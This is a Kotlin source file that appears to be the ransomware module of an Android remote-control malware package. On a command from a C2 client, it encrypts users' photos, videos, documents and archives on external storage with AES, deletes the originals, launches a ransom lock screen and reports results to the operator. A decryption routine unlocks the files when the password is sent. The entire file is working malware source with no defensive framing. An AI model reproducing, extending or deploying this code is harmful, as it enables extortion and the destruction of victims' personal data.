package com.ihk909.payload.modules

import android.content.Context
import android.content.Intent
import android.os.Environment
import com.ihk909.payload.C2Client
import com.ihk909.payload.RansomLockActivity
import org.json.JSONObject
import java.io.File
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

object RansomModule {
    private val ext = arrayOf(
        ".jpg", ".jpeg", ".png", ".gif", ".webp", ".mp4", ".mov", ".avi",
        ".mp3", ".m4a", ".wav", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
        ".ppt", ".pptx", ".txt", ".zip", ".rar", ".7z", ".apk"
    )

    fun start(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val pass = args.getString("password")
            val msg = args.optString("msg", "Your files are encrypted.")
            val target = args.optString("path",
                Environment.getExternalStorageDirectory().absolutePath)
            val key = MessageDigest.getInstance("SHA-256")
                .digest(pass.toByteArray(Charsets.UTF_8))
            val spec = SecretKeySpec(key, "AES")

            Thread {
                val files = ArrayList<File>()
                collect(File(target), files, 0)
                var ok = 0
                for (f in files) {
                    runCatching { encryptFile(f, spec); ok++ }
                }
                runCatching {
                    ctx.getSharedPreferences("ihk909", Context.MODE_PRIVATE).edit()
                        .putBoolean("ransom_locked", true)
                        .putString("ransom_msg", msg)
                        .putString("ransom_pass_hash", sha256(pass))
                        .apply()
                    ctx.startActivity(Intent(ctx, RansomLockActivity::class.java)
                        .putExtra("msg", msg)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    c2.reply(id, JSONObject().put("encrypted", ok).put("total", files.size))
                }.onFailure { c2.replyError(id, it.message ?: "error") }
            }.start()
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun unlock(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val pass = args.getString("password")
            val saved = ctx.getSharedPreferences("ihk909", Context.MODE_PRIVATE)
                .getString("ransom_pass_hash", "")
            if (sha256(pass) != saved) {
                c2.replyError(id, "wrong password")
                return
            }
            val key = MessageDigest.getInstance("SHA-256")
                .digest(pass.toByteArray(Charsets.UTF_8))
            val spec = SecretKeySpec(key, "AES")
            val target = args.optString("path",
                Environment.getExternalStorageDirectory().absolutePath)

            Thread {
                val files = ArrayList<File>()
                collectEnc(File(target), files, 0)
                var ok = 0
                for (f in files) {
                    runCatching { decryptFile(f, spec); ok++ }
                }
                ctx.getSharedPreferences("ihk909", Context.MODE_PRIVATE).edit()
                    .putBoolean("ransom_locked", false).apply()
                c2.reply(id, JSONObject().put("decrypted", ok))
            }.start()
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    private fun collect(dir: File, out: MutableList<File>, depth: Int) {
        if (depth > 6) return
        val files = dir.listFiles() ?: return
        for (f in files) {
            if (f.isDirectory) collect(f, out, depth + 1)
            else if (match(f.name) && !f.name.endsWith(".ihk")) out.add(f)
        }
    }

    private fun collectEnc(dir: File, out: MutableList<File>, depth: Int) {
        if (depth > 6) return
        val files = dir.listFiles() ?: return
        for (f in files) {
            if (f.isDirectory) collectEnc(f, out, depth + 1)
            else if (f.name.endsWith(".ihk")) out.add(f)
        }
    }

    private fun match(name: String): Boolean {
        val l = name.lowercase()
        return ext.any { l.endsWith(it) }
    }

    private fun encryptFile(f: File, spec: SecretKeySpec) {
        val data = f.readBytes()
        val c = Cipher.getInstance("AES/ECB/PKCS5Padding")
            .apply { init(Cipher.ENCRYPT_MODE, spec) }
        File(f.absolutePath + ".ihk").writeBytes(c.doFinal(data))
        f.delete()
    }

    private fun decryptFile(f: File, spec: SecretKeySpec) {
        val data = f.readBytes()
        val c = Cipher.getInstance("AES/ECB/PKCS5Padding")
            .apply { init(Cipher.DECRYPT_MODE, spec) }
        File(f.absolutePath.dropLast(4)).writeBytes(c.doFinal(data))
        f.delete()
    }

    private fun sha256(s: String): String =
        MessageDigest.getInstance("SHA-256").digest(s.toByteArray(Charsets.UTF_8))
            .joinToString("") { "%02x".format(it) }
}